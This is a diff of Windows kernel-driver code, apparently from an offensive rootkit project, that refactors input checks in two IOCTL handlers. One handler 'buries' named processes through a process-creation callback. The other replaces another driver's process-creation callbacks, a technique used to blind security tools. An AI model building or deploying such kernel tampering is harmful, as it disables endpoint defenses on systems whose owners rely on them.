@@ -253,25 +253,10 @@ BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize)
     LOG_MSG("BeIoctlBuryProcess called, size: %i \r\n", dwSize);
     __try
     {
-        // Check alignment
-        if (dwSize % sizeof(WCHAR) != 0)
+        NtStatus = BeCheckStringIsAlignedNotEmptyAndTerminated(processToBury, dwSize);
+        if (NtStatus != STATUS_SUCCESS)
         {
-            LOG_MSG("Invalid alignment \r\n");
-            return STATUS_INVALID_BUFFER_SIZE;
-        }
-
-        if (!processToBury)
-        {
-            LOG_MSG("Empty buffer \r\n");
-            return STATUS_INVALID_PARAMETER;
-        }
-
-        LOG_MSG("String received: %ws \r\n", processToBury);
-
-        if (BeIsStringTerminated(processToBury, dwSize) == FALSE)
-        {
-            LOG_MSG("Not null terminated! \r\n");
-            return STATUS_UNSUCCESSFUL;
+            return NtStatus;
         }
 
         // Allocate global memory for process name and copy over to global
@@ -283,8 +268,8 @@ BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize)
         RtlCopyMemory(BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length], processToBury, dwSize);
         BeGlobals::beBuryTargetProcesses.length++; // increment number of processes buried
 
-        NtStatus = PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE); // remove to avoid routines being registered twice
-        NtStatus = PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, FALSE);
+        NtStatus = BeGlobals::pPsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE); // remove to avoid routines being registered twice
+        NtStatus = BeGlobals::pPsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, FALSE);
         
         if (NtStatus == STATUS_SUCCESS)
         {
@@ -485,28 +470,12 @@ BeIoctlEraseCallbacks(PWCHAR targetDriver, ULONG dwSize)
 
     __try
     {
-        // TODO: wrap all this string checking code into a function
-        // Check alignment
-        if (dwSize % sizeof(WCHAR) != 0)
+        NtStatus = BeCheckStringIsAlignedNotEmptyAndTerminated(targetDriver, dwSize);
+        if (NtStatus != STATUS_SUCCESS)
         {
-            LOG_MSG("Invalid alignment \r\n");
-            return STATUS_INVALID_BUFFER_SIZE;
+            return NtStatus;
         }
-
-        if (!targetDriver)
-        {
-            LOG_MSG("Empty buffer \r\n");
-            return STATUS_INVALID_PARAMETER;
-        }
-
-        LOG_MSG("String received: %ws \r\n", targetDriver);
-
-        if (BeIsStringTerminated(targetDriver, dwSize) == FALSE)
-        {
-            LOG_MSG("Not null terminated! \r\n");
-            return STATUS_UNSUCCESSFUL;
-        }
-
+        
         // TODO: also get type of callback. for now hardcoded to createprocess callbacks
         NtStatus = BeReplaceKernelCallbacksOfDriver(targetDriver, CreateProcessNotifyRoutine);
     }
